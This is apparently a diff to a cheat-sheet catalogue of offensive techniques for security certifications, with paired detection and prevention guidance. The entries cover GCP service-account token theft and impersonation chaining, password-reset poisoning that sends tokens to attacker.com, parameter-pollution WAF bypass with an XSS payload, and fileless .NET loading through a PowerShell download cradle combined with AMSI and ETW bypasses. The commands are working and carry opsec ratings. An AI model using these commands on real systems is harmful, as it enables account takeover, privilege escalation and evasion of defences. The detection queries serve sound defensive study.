+          "title": "GCP docs - Querying metadata (default SA token)",
+          "url": "https://cloud.google.com/compute/docs/metadata/querying-metadata"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-metadata-token",
+          "note": "Core metadata-token retrieval technique.",
+          "rel": "alternative"
+        },
+        {
+          "id": "gcp-iam-enum",
+          "note": "Enumerate what the stolen SA token can do.",
+          "rel": "next"
+        },
+        {
+          "id": "ssrf-exploit",
+          "note": "General SSRF exploitation to reach the metadata host.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The metadata server hands any local process the attached SA's OAuth token on request. GCP's required Metadata-Flavor: Google header blocks naive SSRF, but a shell or a header-capable SSRF retrieves the token, inheriting the SA's permissions for the token's lifetime.",
+        "prerequisites": "An SSRF that can set the Metadata-Flavor header (or a legacy v0.1/v1beta1 image that did not require it), or any code execution on the instance; an attached service account with meaningful scopes/roles.",
+        "impact": "Theft of the instance SA's access token, granting its project permissions (often Cloud Storage, Compute, or broader) and enabling lateral movement, data exfiltration, and further privesc.",
+        "detection": "[MITRE T1552.005] Cloud Audit Logs showing the instance SA's token used from an IP outside the instance/project egress; API calls the SA has never made; VPC egress to unexpected destinations after a web request; the web app's logs show fetches to metadata.google.internal.",
+        "artifacts": "Audit log entries with authenticationInfo.principalEmail = the instance SA used from an external callerIp; application logs with outbound requests to 169.254.169.254 / metadata.google.internal; GKE/Cloud Run request logs.",
+        "splunk_spl": "index=gcp protoPayload.authenticationInfo.principalEmail=\"*gserviceaccount.com\"\n| stats dc(protoPayload.requestMetadata.callerIp) as ips values(protoPayload.methodName) as methods by protoPayload.authenticationInfo.principalEmail\n| where ips>1",
+        "elastic_kql": "gcp.audit.authentication_info.principal_email:*gserviceaccount.com and not source.ip:(10.0.0.0/8 or 172.16.0.0/12)",
+        "sentinel_kql": "GCPAuditLogs\n| where PrincipalEmail endswith \"gserviceaccount.com\"\n| summarize IPs=dcount(CallerIp), Methods=make_set(MethodName) by PrincipalEmail\n| where IPs > 1",
+        "sigma_rules": "gcp_instance_sa_token_used_externally",
+        "prevention": "Fix the SSRF (deny link-local/metadata ranges, do not forward arbitrary headers); use GKE Workload Identity instead of node SA tokens; disable legacy v0.1/v1beta1 metadata endpoints (disable-legacy-endpoints=true); attach least-privilege SAs with minimal scopes; set VPC Service Controls and egress firewall rules; alert on SA token use from outside the project.",
+        "sources": [
+          "https://hackingthe.cloud/gcp/general-knowledge/gcp-metadata-ssrf/",
+          "https://cloud.google.com/compute/docs/metadata/querying-metadata"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Instance service-account token used from an external IP",
+            "logic": "GCPAuditLogs\n| where PrincipalEmail endswith \"gserviceaccount.com\"\n| summarize IPs=dcount(CallerIp), Methods=make_set(MethodName) by PrincipalEmail\n| where IPs > 1",
+            "data_source": "gcp-audit",
+            "attack": [
+              "T1552.005",
+              "T1078.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "SAs legitimately used from CI/CD or on-prem via their own egress IPs",
+            "tuning": "Baseline each instance SA's normal caller IPs; alert on new external IPs and on API methods the SA has never called"
+          }
+        ]
+      }
     },
     {
       "id": "gcp-metadata-token",
@@ -54465,6 +56853,110 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Creates a long-lived JSON key for a service account you can manage - stealthy GCP persistence:\n  gcloud iam service-accounts keys create key.json   generate a new key and save it locally\n  --iam-account <sa_email>   the service account to mint the key for\nRequires iam.serviceAccountKeys.create. The downloaded key authenticates as the SA indefinitely, is MFA-independent, and survives user password resets - activate it later with gcloud auth activate-service-account."
+    },
+    {
+      "id": "gcp-sa-impersonation",
+      "name": "GCP Service Account Impersonation - getAccessToken / actAs",
+      "command": "gcloud auth print-access-token --impersonate-service-account=<target>",
+      "description": "Impersonate a higher-privileged GCP service account using iam.serviceAccounts.getAccessToken (or signJwt/getOpenIdToken). With roles/iam.serviceAccountTokenCreator (or actAs) over a target SA, mint short-lived access tokens as that SA and inherit its permissions - a primary GCP privilege-escalation path that needs no key file and leaves the attacker acting as a different identity.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "GCP Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "Rhino Security Labs / GCP docs",
+      "tags": [
+        "gcp",
+        "service-account",
+        "impersonation",
+        "token-creator",
+        "actas",
+        "privesc",
+        "iam"
+      ],
+      "mitre": [
+        "T1078.004",
+        "T1098"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE PRIMITIVE ===\n  If you (or an SA you control) have iam.serviceAccounts.getAccessToken on a\n  target SA (role roles/iam.serviceAccountTokenCreator), you can mint tokens\n  AS that SA. getOpenIdToken / signJwt are related primitives.\n\n=== FIND WHERE YOU CAN IMPERSONATE ===\n  gcloud iam service-accounts list\n  # who has TokenCreator on a given SA:\n  gcloud iam service-accounts get-iam-policy <target>\n  # project-wide view:\n  gcloud projects get-iam-policy <project> --format=json\n\n=== MINT A TOKEN AS THE TARGET SA ===\n  gcloud auth print-access-token --impersonate-service-account=<target>\n  # or attach impersonation to any gcloud command:\n  gcloud storage ls --impersonate-service-account=<target>\n  gcloud compute instances list --impersonate-service-account=<target>\n\n=== RAW API (explicit) ===\n  curl -X POST -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \\\n    -H 'Content-Type: application/json' \\\n    \"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<target>:generateAccessToken\" \\\n    -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}'\n\n=== actAs CHAINING ===\n  roles/iam.serviceAccountUser (actAs) lets you attach a privileged SA to a\n  new resource (VM, function, job) that then runs as that SA - see the\n  Cloud Function privesc card.\n\n=== NEXT ===\n  Chain: impersonate SA_A, which can impersonate SA_B, up to an admin SA.",
+      "examples": [
+        {
+          "label": "Print an access token as the target SA",
+          "command": "gcloud auth print-access-token --impersonate-service-account=<target>"
+        },
+        {
+          "label": "Run a command as the impersonated SA",
+          "command": "gcloud storage ls --impersonate-service-account=<target>"
+        },
+        {
+          "label": "Check who can impersonate an SA",
+          "command": "gcloud iam service-accounts get-iam-policy <target>"
+        }
+      ],
+      "references": [
+        {
+          "title": "Rhino Security Labs - GCP privilege escalation",
+          "url": "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
+        },
+        {
+          "title": "GCP docs - Create short-lived credentials (impersonation)",
+          "url": "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "gcp-iam-privesc",
+          "note": "Broader catalogue of GCP IAM privesc primitives.",
+          "rel": "alternative"
+        },
+        {
+          "id": "gcp-iam-enum",
+          "note": "Enumerate IAM policies to find impersonation rights.",
+          "rel": "prereq"
+        },
+        {
+          "id": "gcp-cloudfunction-deploy-privesc",
+          "note": "actAs chaining via attaching an SA to a function.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Service-account impersonation is a sanctioned GCP feature. The IAM role roles/iam.serviceAccountTokenCreator grants iam.serviceAccounts.getAccessToken, and anyone holding it over a target SA can mint short-lived tokens as that SA and inherit its roles - no key file, just an API call.",
+        "prerequisites": "A principal (user or SA) with roles/iam.serviceAccountTokenCreator (or actAs / serviceAccountUser for resource-attach chaining) over a more privileged target service account.",
+        "impact": "Privilege escalation to the target SA's permissions and lateral movement by chaining impersonation across SAs toward project owner/editor; the attacker operates under a different identity, complicating attribution.",
+        "detection": "[MITRE T1078.004] Cloud Audit Logs GenerateAccessToken / GenerateIdToken / SignJwt calls on iamcredentials.googleapis.com, especially new principal->target pairs or chains; impersonated tokens used from unusual IPs.",
+        "artifacts": "Audit log entries protoPayload.serviceName=iamcredentials.googleapis.com with methodName GenerateAccessToken/GenerateIdToken/SignJwt, authenticationInfo.principalEmail (caller) and request.name (target SA); downstream API calls attributed to the target SA.",
+        "splunk_spl": "index=gcp (protoPayload.serviceName=iamcredentials.googleapis.com)\n| search protoPayload.methodName=\"*GenerateAccessToken*\" OR protoPayload.methodName=\"*GenerateIdToken*\" OR protoPayload.methodName=\"*SignJwt*\"\n| stats count by protoPayload.authenticationInfo.principalEmail, protoPayload.request.name",
+        "elastic_kql": "gcp.audit.service_name:\"iamcredentials.googleapis.com\" and gcp.audit.method_name:(*GenerateAccessToken* or *GenerateIdToken* or *SignJwt*)",
+        "sentinel_kql": "GCPAuditLogs\n| where ServiceName == \"iamcredentials.googleapis.com\"\n| where MethodName has_any (\"GenerateAccessToken\",\"GenerateIdToken\",\"SignJwt\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+        "sigma_rules": "gcp_service_account_impersonation",
+        "prevention": "Grant roles/iam.serviceAccountTokenCreator and serviceAccountUser narrowly and per-SA (never at project level); prefer workload identity over keys; use IAM Recommender to strip unused impersonation rights; enable Data Access audit logs for IAM Credentials; alert on new impersonation principal/target pairs and on chains.",
+        "sources": [
+          "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/",
+          "https://cloud.google.com/iam/docs/create-short-lived-credentials-direct"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Service account access-token impersonation",
+            "logic": "GCPAuditLogs\n| where ServiceName == \"iamcredentials.googleapis.com\"\n| where MethodName has_any (\"GenerateAccessToken\",\"GenerateIdToken\",\"SignJwt\")\n| summarize Count=count() by PrincipalEmail, ResourceName",
+            "data_source": "gcp-audit",
+            "attack": [
+              "T1078.004",
+              "T1098"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate automation and workload-identity flows that impersonate SAs",
+            "tuning": "Baseline normal caller->target impersonation pairs; alert on new pairs, cross-project targets, or impersonation chains"
+          }
+        ]
+      }
     },
     {
       "id": "ad-genericall-group",
@@ -62472,6 +64964,110 @@ const COMMAND_DATA = {
       "explain": "Performs DNS lookups with the host command:\n  host <domain>   forward-resolve the name to its A/AAAA records\nAdd -t mx/txt/ns for specific record types; the card also covers forward brute-forcing a subdomain wordlist and reverse PTR sweeps of an IP range to map a target's DNS."
     },
     {
+      "id": "web-host-header-injection",
+      "name": "Host Header Injection (Reset Poisoning, Routing SSRF)",
+      "command": "POST /forgot-password HTTP/1.1\\nHost: attacker.com\\n\\nemail=<user>",
+      "description": "Abuses an application's trust in the HTTP Host (or X-Forwarded-Host) header. Primary impacts: password-reset poisoning (the reset link is built from the attacker-controlled host so the token is sent to the attacker), routing-based SSRF (manipulating the host to reach internal systems through the front-end), cache issues, and authentication/validation bypass via an injected or duplicated Host header.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "Server-Side",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "PortSwigger Web Security Academy - HTTP Host header attacks",
+      "tags": [
+        "host-header",
+        "password-reset-poisoning",
+        "routing-ssrf",
+        "x-forwarded-host"
+      ],
+      "mitre": [
+        "T1190",
+        "T1659"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  Apps read the Host header to build absolute URLs (reset links, redirects) or to route requests. If that value is attacker-controlled and trusted, links point at the attacker and routing can be redirected internally.\n\n=== PASSWORD-RESET POISONING ===\n  1. Trigger a reset for the victim's email, but set Host: attacker.com (or X-Forwarded-Host).\n  2. The app emails the victim a link like https://attacker.com/reset?token=... built from your host.\n  3. When the victim clicks, the token hits your server -> account takeover.\n  Variants: inject a second Host header, use X-Forwarded-Host, or Host: target.com:@attacker.com.\n\n=== ROUTING-BASED SSRF ===\n  - Some front-ends route upstream based on the Host header. Changing it can reach internal vhosts or the cloud metadata endpoint.\n  - Try Host: 169.254.169.254, Host: localhost, or internal names; watch for different responses.\n\n=== VALIDATION / AUTH BYPASS ===\n  - Access controls keyed on Host (e.g. 'only Host: internal admin') can be spoofed.\n  - Duplicate Host headers / absolute-URI request line to confuse the parser.\n\n=== TESTS ===\n  - Change Host outright; if the site still works, the header is trusted downstream.\n  - Add X-Forwarded-Host: attacker.com and look for it reflected in links/redirects.\n  - Use Burp Repeater; inspect reset emails / Location headers.",
+      "examples": [
+        {
+          "label": "Password-reset poisoning via X-Forwarded-Host",
+          "command": "curl -s https://<target>/forgot-password -H 'X-Forwarded-Host: attacker.com' -d 'email=<user>'"
+        },
+        {
+          "label": "Routing SSRF probe to cloud metadata",
+          "command": "curl -s https://<target>/ -H 'Host: 169.254.169.254'"
+        },
+        {
+          "label": "Duplicate Host header to test parser trust",
+          "command": "printf 'GET / HTTP/1.1\\r\\nHost: <target>\\r\\nHost: attacker.com\\r\\n\\r\\n' | ncat --ssl <target> 443"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - HTTP Host header attacks",
+          "url": "https://portswigger.net/web-security/host-header"
+        },
+        {
+          "title": "PortSwigger - Password reset poisoning",
+          "url": "https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning"
+        },
+        {
+          "title": "OWASP - Testing for Host Header Injection",
+          "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-cache-poisoning",
+          "note": "Host-header reflection is a primary unkeyed input for poisoning a cache.",
+          "rel": "next"
+        },
+        {
+          "id": "ssrf-identify",
+          "note": "Routing-based Host abuse is a path into SSRF of internal services.",
+          "rel": "next"
+        },
+        {
+          "id": "auth-vuln-password-reset",
+          "note": "Reset-poisoning is one of several password-reset takeover techniques.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The application builds security-sensitive URLs (password-reset links, redirects) or routing decisions from the client-controlled Host / X-Forwarded-Host header, so an attacker who changes it redirects tokens to their server or reaches internal upstreams.",
+        "prerequisites": "An app that reflects or routes on the Host/X-Forwarded-Host header and does not validate it against an allow-list. For reset poisoning, the ability to trigger a reset for the victim's account.",
+        "impact": "Account takeover via stolen reset tokens, SSRF into internal services and cloud metadata, cache poisoning, and bypass of Host-based access controls.",
+        "detection": "[MITRE T1190] Requests whose Host or X-Forwarded-Host does not match the site's canonical domain(s), duplicate Host headers, Host values pointing at RFC1918/link-local addresses, and password-reset emails whose link host differs from the canonical host.",
+        "artifacts": "Reverse-proxy/web access logs capturing the Host and X-Forwarded-Host headers, mail-gateway logs of outbound reset links, and application logs of reset-token generation.",
+        "splunk_spl": "index=web uri_path=\"/forgot-password\"\n| rex field=_raw \"X-Forwarded-Host:\\s*(?<xfh>[^\\r\\n]+)\"\n| rex field=_raw \"\\nHost:\\s*(?<host>[^\\r\\n]+)\"\n| where (isnotnull(xfh) AND xfh!=\"<target>\") OR (isnotnull(host) AND host!=\"<target>\")\n| stats count by clientip, host, xfh",
+        "elastic_kql": "url.path:\"/forgot-password\" and (http.request.headers.x-forwarded-host:* and not http.request.headers.x-forwarded-host:\"<target>\")",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem =~ \"/forgot-password\"\n| extend host = csHost\n| where host != \"<target>\"\n| summarize count() by cIP, host",
+        "sigma_rules": "web_host_header_injection_reset_poisoning",
+        "prevention": "Do not trust the Host header for anything security-relevant: build absolute URLs from a server-side configured canonical domain, validate Host against an allow-list and return 400 otherwise, strip or ignore X-Forwarded-Host unless set by your own edge, and bind reset tokens to the account and a fixed base URL.",
+        "sources": [
+          "https://portswigger.net/web-security/host-header",
+          "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Password-reset request with off-domain Host / X-Forwarded-Host",
+            "logic": "index=web sourcetype=apache uri_path=\"/forgot-password\"\n| rex field=_raw \"X-Forwarded-Host:\\s*(?<xfh>[^\\r\\n]+)\"\n| rex field=_raw \"\\nHost:\\s*(?<host>[^\\r\\n]+)\"\n| where (isnotnull(host) AND NOT match(host, \"^<target>$\")) OR (isnotnull(xfh) AND NOT match(xfh, \"^<target>$\"))\n| stats count by clientip, host, xfh",
+            "data_source": "apache",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate alternate domains / vanity hosts the app genuinely serves.",
+            "tuning": "Allow-list every canonical and vanity host; alert only on reset endpoints with an unrecognized host value."
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -63212,6 +65808,109 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "HTTP traffic analysis for malicious activity: directory fuzzing (rapid 404s from one host), parameter/IDOR fuzzing (sequential ID modification), strange Host headers (virtual host confusion), CRLF/HTTP request smuggling (injected CR+LF to split requests), and XSS cookie theft (JavaScript exfiltrating cookies via GET requests).\nAlso covers Apache access log analysis to correlate Wireshark findings.\n=== DIRECTORY FUZZING DETECTION ===\nHow it works:\n   Attacker uses tools (ffuf, gobuster, dirb) to probe all possible web paths\n   Sends rapid HTTP GET requests for paths that don't exist\n   Dis..."
+    },
+    {
+      "id": "web-http-parameter-pollution",
+      "name": "HTTP Parameter Pollution (HPP)",
+      "command": "GET /search?role=user&role=admin HTTP/1.1\\nHost: <target>",
+      "description": "Supplies the same parameter multiple times so different components (WAF, front-end, back-end, framework) disagree on which value wins. Used to bypass WAF/input validation (the filter inspects one occurrence, the app uses another), tamper with server-side logic (role/price/id), and smuggle values past allow-lists. Covers per-backend precedence (first vs last vs concatenated) for query-string and body parameters.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Web",
+      "subcategory": "Input Validation",
+      "certifications": [
+        "CWES"
+      ],
+      "primary_cert": "CWES",
+      "source": "OWASP - Testing for HTTP Parameter Pollution",
+      "tags": [
+        "hpp",
+        "parameter-pollution",
+        "waf-bypass",
+        "input-validation"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== WHY IT WORKS ===\n  HTTP does not define how duplicate parameters are handled, so each layer picks its own: some take the FIRST, some the LAST, some CONCATENATE, some build an array. A WAF that inspects the first value and an app that uses the last can be split.\n\n=== PER-BACKEND PRECEDENCE (common) ===\n  - PHP / Apache:            LAST occurrence wins (foo=a&foo=b -> b)\n  - ASP.NET / IIS:           CONCATENATED with comma (foo=a&foo=b -> \"a,b\")\n  - JSP / Tomcat:            FIRST occurrence wins (foo=a&foo=b -> a)\n  - Node/Express:            builds an ARRAY (foo=[a,b])\n  - Python Flask/Django:     FIRST (request.args.get) by default\n  (Always confirm empirically - versions/parsers vary.)\n\n=== CLASSIC USES ===\n  - WAF bypass: split a blocked payload across two occurrences of the same param, or put the malicious value where the WAF does not look.\n  - Auth/logic tamper: ?role=user&role=admin so the back-end that takes last gets admin.\n  - OTP/price/id confusion in multi-tier apps.\n  - Combine with SQLi: id=1&id=2 UNION SELECT... where the sink concatenates.\n\n=== TESTS ===\n  - Send the param twice with distinct values; observe which the response reflects/uses.\n  - Try query-string vs body (POST) separately - precedence can differ.\n  - Encode one occurrence (%72ole) to dodge the filter while the app normalizes.\n\n=== TOOLING ===\n  - Burp Repeater (manual duplication), Param Miner for discovery, hackvertor for encoding.",
+      "examples": [
+        {
+          "label": "Role tamper via duplicate param (last wins)",
+          "command": "curl -s 'https://<target>/api/update?role=user&role=admin'"
+        },
+        {
+          "label": "WAF bypass splitting a payload across duplicates",
+          "command": "curl -s 'https://<target>/search?q=<script&q=>alert(1)</script>'"
+        },
+        {
+          "label": "POST body pollution",
+          "command": "curl -s https://<target>/login -d 'user=guest&user=admin'"
+        }
+      ],
+      "references": [
+        {
+          "title": "OWASP - Testing for HTTP Parameter Pollution",
+          "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
+        },
+        {
+          "title": "OWASP - HTTP Parameter Pollution (attack)",
+          "url": "https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution_(HPP)"
+        },
+        {
+          "title": "PortSwigger - HTTP Parameter Pollution (API testing)",
+          "url": "https://portswigger.net/web-security/api-testing/server-side-parameter-pollution"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-request-smuggling",
+          "note": "Another layer-disagreement class (front-end vs back-end parsing).",
+          "rel": "alternative"
+        },
+        {
+          "id": "sqli-detect",
+          "note": "HPP can carry an SQLi payload past a WAF into a concatenating sink.",
+          "rel": "next"
+        },
+        {
+          "id": "auth-bypass-param-mod",
+          "note": "Parameter manipulation for auth bypass overlaps directly.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "HTTP has no standard for duplicate parameters, so the WAF, framework, and application may each resolve them differently. An attacker exploits that disagreement to put the payload where the filter will not see it but the app will use it.",
+        "prerequisites": "An endpoint reachable through layers that parse duplicate parameters inconsistently (e.g. a WAF that reads the first value, an app that reads the last).",
+        "impact": "WAF/validation bypass, authorization and business-logic tampering (role/price/id), and amplification of injection attacks (SQLi/XSS) that would otherwise be blocked.",
+        "detection": "[MITRE T1190] Requests containing the same parameter name more than once in the query string or body, especially on auth/role/price endpoints or where one occurrence contains suspicious characters.",
+        "artifacts": "Web/reverse-proxy access logs capturing the full query string and body, WAF event logs (which value triggered/did not), and application logs of the resolved parameter value.",
+        "splunk_spl": "index=web\n| rex max_match=0 field=uri_query \"(?<param>[a-zA-Z0-9_]+)=\"\n| eval dupes=mvfilter(mvcount(mvdedup(param))<mvcount(param))\n| where mvcount(param)!=mvcount(mvdedup(param))\n| stats count by clientip, uri_path, uri_query",
+        "elastic_kql": "url.query:/.*([a-zA-Z0-9_]+)=.*\\1=.*/ and url.path:(\"/login\" or \"/api/update\")",
+        "sentinel_kql": "W3CIISLog\n| extend params = extract_all(@\"[?&]([a-zA-Z0-9_]+)=\", csUriQuery)\n| extend total = array_length(params), uniq = array_length(set_difference(params, dynamic([])))\n| where total > uniq\n| summarize count() by cIP, csUriStem, csUriQuery",
+        "sigma_rules": "web_http_parameter_pollution_duplicate_param",
+        "prevention": "Normalize duplicate parameters consistently at the edge (reject or collapse to a single defined occurrence). Use a framework API that returns a single value and reject arrays/duplicates for security-sensitive fields. Keep WAF and application parsing aligned, validate against strict allow-lists, and prefer typed/structured input (JSON) with schema validation.",
+        "sources": [
+          "https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution_(HPP)",
+          "https://portswigger.net/web-security/api-testing/server-side-parameter-pollution"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Duplicate parameter name on a sensitive endpoint",
+            "logic": "index=web sourcetype=apache (uri_path=\"/login\" OR uri_path=\"/api/update\" OR uri_path=\"/checkout\")\n| rex max_match=0 field=uri_query \"(?<param>[a-zA-Z0-9_]+)=\"\n| where mvcount(param)!=mvcount(mvdedup(param))\n| stats count by clientip, uri_path, uri_query",
+            "data_source": "apache",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Legitimate multi-value fields (checkbox groups, filters) that intentionally repeat a parameter.",
+            "tuning": "Scope to endpoints that should take single-valued security-relevant parameters; allow-list known multi-value fields."
+          }
+        ]
+      }
     },
     {
       "id": "web-request-smuggling",
@@ -69012,6 +71711,129 @@ const COMMAND_DATA = {
             "tuning": "Baseline normal owner-change activity; alert on ownership changes to sensitive accounts (adminCount=1)"
           }
         ]
+      }
+    },
+    {
+      "id": "win-clr-execute-assembly",
+      "name": "In-Memory .NET Assembly Execution (execute-assembly / CLR hosting)",
+      "command": "Load a .NET assembly into memory and invoke its entry point without touching disk",
+      "description": "In-memory .NET execution loads an assembly directly from a byte array (via [Reflection.Assembly]::Load or native CLR hosting - ICLRRuntimeHost/ICLRMetaHost) and invokes its entry point, so offensive .NET tools (Rubeus, Seatbelt, SharpHound) run entirely in memory with no PE on disk. This is the mechanic behind Cobalt Strike execute-assembly and is a reflective/non-standard module load (T1620).",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Defense Evasion",
+      "subcategory": "Defense Evasion",
+      "certifications": [
+        "CRTP"
+      ],
+      "primary_cert": "CRTP",
+      "source": "MITRE ATT&CK T1620 (Reflective Code Loading); CLR hosting documentation",
+      "tags": [
+        "execute-assembly",
+        "clr-hosting",
+        "in-memory",
+        "dotnet",
+        "reflective-loading",
+        "defense-evasion"
+      ],
+      "mitre": [
+        "T1620",
+        "T1059.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== TWO COMMON PATHS ===\n  1. Managed (PowerShell):\n     $b = (New-Object Net.WebClient).DownloadData('<url>')\n     [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,[string[]]@('args')))\n  2. Native CLR hosting (unmanaged loader):\n     ICLRMetaHost -> ICLRRuntimeInfo -> ICorRuntimeHost/ICLRRuntimeHost -> load + ExecuteInDefaultAppDomain\n     # used by execute-assembly so you can run .NET from an unmanaged implant.\n\n=== WHY IT EVADES ===\n  - No .NET EXE on disk, so on-disk AV signatures never fire.\n  - Pairs with ETW patching (to blind Microsoft-Windows-DotNETRuntime) and AMSI bypass\n    (.NET assemblies ARE scanned by AMSI since .NET 4.8 / Windows 10).\n\n=== KEY DETECTION SURFACE (so pair with the blinds above) ===\n  - CLR loaded into a process that is not normally managed (clr.dll/clrjit.dll in e.g. a C2 stager).\n  - ETW .NET provider: assembly load events, Rundown.\n  - AMSI amsiScanBuffer of the assembly bytes (.NET 4.8+).\n\n=== ALTERNATIVES ===\n  Reflective DLL injection, PowerShell IEX cradle (scriptable, but AMSI-scanned),\n  BOF (beacon object files) for small C capabilities.",
+      "examples": [
+        {
+          "label": "Load and run a .NET assembly from bytes in PowerShell",
+          "command": "[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,[string[]]@()))"
+        },
+        {
+          "label": "Cobalt-style operator syntax (reference)",
+          "command": "execute-assembly C:\\tools\\Seatbelt.exe -group=system"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1620 - Reflective Code Loading",
+          "url": "https://attack.mitre.org/techniques/T1620/"
+        },
+        {
+          "title": "Microsoft - Hosting the Common Language Runtime",
+          "url": "https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "amsi-bypass",
+          "note": ".NET assemblies are AMSI-scanned on 4.8+, so bypass AMSI first.",
+          "rel": "prereq"
+        },
+        {
+          "id": "win-etw-patching",
+          "note": "Blind the .NET ETW provider before the in-memory load.",
+          "rel": "next"
+        },
+        {
+          "id": "process-injection-runner",
+          "note": "Shellcode injection is the unmanaged analogue of in-memory loading.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The CLR exposes documented APIs to load an assembly from a byte array and invoke it, and native hosting interfaces let an unmanaged process spin up the runtime on demand. Because the assembly never lands on disk, file-based detection has nothing to scan; only in-memory and ETW/AMSI telemetry observe it.",
+        "prerequisites": "Code execution in a process that can host the CLR (or already does). No admin required. On .NET 4.8+/Windows 10 the loaded bytes are passed to AMSI unless AMSI is already bypassed.",
+        "impact": "T1620 Reflective Code Loading. Runs full .NET offensive tooling (credential, recon, lateral-movement tools) in memory under a benign process, with no dropped executable.",
+        "detection": "Alert on clr.dll/clrjit.dll/mscoree.dll loading into a process that is not a known .NET application; the Microsoft-Windows-DotNETRuntime ETW provider assembly-load and AMSI assembly-scan events; AMSI amsiScanBuffer results on unsigned in-memory assemblies; EDR managed-memory scanning. If ETW is silenced, the silence plus a CLR load in an odd host is itself suspicious.",
+        "artifacts": "Sysmon EID 7 (ImageLoad) of clr.dll/clrjit.dll in an unexpected process; Microsoft-Windows-DotNETRuntime ETW events; AMSI 1033 scan events for .NET content; EDR in-memory .NET module detections.",
+        "splunk_spl": "index=sysmon EventCode=7 ImageLoaded IN (\"*clr.dll\",\"*clrjit.dll\",\"*mscoree.dll\")\n| search NOT Image IN (\"*powershell.exe\",\"*powershell_ise.exe\",\"*w3wp.exe\",\"*devenv.exe\")\n| stats count by Image, ImageLoaded, Computer",
+        "elastic_kql": "event.code:\"7\" and dll.name:(clr.dll or clrjit.dll or mscoree.dll) and not process.name:(powershell.exe or w3wp.exe or devenv.exe)",
+        "sentinel_kql": "DeviceImageLoadEvents\n| where FileName in~ (\"clr.dll\",\"clrjit.dll\",\"mscoree.dll\")\n| where InitiatingProcessFileName !in~ (\"powershell.exe\",\"powershell_ise.exe\",\"w3wp.exe\",\"devenv.exe\",\"dotnet.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName",
+        "sigma_rules": "image_load_win_clr_in_unmanaged_process",
+        "prevention": "Keep AMSI enforced and enable Tamper Protection so .NET content is scanned on load; ship EDR with managed in-memory scanning; enforce WDAC to constrain which assemblies can execute; monitor the .NET ETW provider centrally and alert on CLR loads in non-.NET processes; baseline which hosts legitimately host the runtime.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1620/",
+          "https://learn.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "CLR loaded into a non-.NET host process",
+            "logic": "index=sysmon EventCode=7 ImageLoaded IN (\"*clr.dll\",\"*clrjit.dll\",\"*mscoree.dll\") NOT Image IN (\"*powershell.exe\",\"*w3wp.exe\",\"*devenv.exe\",\"*dotnet.exe\")\n| stats count by Image, ImageLoaded, Computer",
+            "data_source": "sysmon",
+            "attack": [
+              "T1620"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Any legitimate app that embeds the CLR (installers, management agents)",
